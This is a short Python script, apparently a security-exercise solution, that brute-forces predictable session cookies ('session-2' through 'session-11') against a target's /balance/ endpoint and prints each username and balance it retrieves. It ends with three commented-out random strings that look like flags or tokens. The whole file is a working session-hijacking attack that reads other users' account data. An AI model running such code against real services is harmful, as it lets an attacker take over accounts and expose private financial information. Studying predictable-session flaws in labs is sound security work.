import sys
import requests
import json


def test_session(address):
	# write your code here
	x= requests.get(address)
	for i in range(2,12):
		session_id="session-"+str(i)
		response= requests.get(address+"/balance/", headers={'Cookie': f'sessionid={session_id}'})
		response= response.json()
		user=response["username"]
		amount=response["balance"]
		if amount>0:
			print(user, amount)
	return None



def main(argv):
	address = sys.argv[1]
	print(test_session(address))

if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python3 %s address' % sys.argv[0])
	else:
		main(sys.argv)

#W25T3lFzi0flx8x4HbcG7FsvPqOlfcYu
#KNAwRpKZpop50qYdy6EQ56dpyffXxYz5
#AFRt10EVdTOuq0ccbGiSPBfOZWwwkC79